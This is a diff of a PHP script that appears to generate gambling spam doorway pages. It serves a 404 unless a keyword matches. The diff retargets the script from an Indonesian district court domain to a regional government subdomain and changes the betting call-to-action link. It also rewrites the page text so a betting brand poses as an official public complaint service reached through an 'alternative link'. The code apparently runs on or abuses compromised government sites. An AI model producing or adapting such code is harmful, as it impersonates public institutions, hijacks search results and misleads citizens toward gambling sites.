@@ -43,15 +43,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://tamuramah.com/id/$dashbrand";
-$canonical = "https://pn-manado.go.id/slide/$dashbrand";
-$cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729171278/OIG1.lL3DsLBH1rjOd4mzGikn_mjqmzj.jpg";
+$amphtml = "https://needmariju.top/page/$dashbrand";
+$canonical = "https://kel-semarang.banjarnegarakab.go.id/berita/$dashbrand";
+$cta = "https://t.ly/betboss";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729082465/OIG3.D6yR1W8ZA.yDN4Nj16Ew_1_kmawfn.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Layanan Pengadilan Negeri Manado Kelas 1A";
-$desc = "Lembaga pengadilan negeri Manado kini melayani serta bertanggung jawab untuk memberikan wadah kepada masyarakat jika ada pengaduan atau permasalahan pribadi maupun kelompok didalam sosial masyarakat bisa mengadukan melalui $namabrand link alternatif yang disediakan untuk warga.";
-$konten = "Lembaga pengadilan negeri Manado kini melayani serta bertanggung jawab untuk memberikan wadah kepada masyarakat jika ada pengaduan atau permasalahan pribadi maupun kelompok didalam sosial masyarakat bisa mengadukan melalui $namabrand link alternatif yang disediakan untuk warga.";
+$judul = "$namabrand Kabupaten Banjarnegara Kelurahan Semarang";
+$desc = "Lembaga disetiap daerah memiliki fungsi dan tugasnya masing-masing dengan salah satu contoh di kota Semarang yakni di Kabupaten Banjarnegara yang memiliki sebuah layanan publik secara online di $namabrand untuk masyarkat agar lebih mudah dijangkau setiap keluhan atau kendala yang dimiliki masyarkat melalui link alternatif.";
+$konten = "Lembaga disetiap daerah memiliki fungsi dan tugasnya masing-masing dengan salah satu contoh di kota Semarang yakni di Kabupaten Banjarnegara yang memiliki sebuah layanan publik secara online di $namabrand untuk masyarkat agar lebih mudah dijangkau setiap keluhan atau kendala yang dimiliki masyarkat melalui link alternatif.";
 ?>
 
 
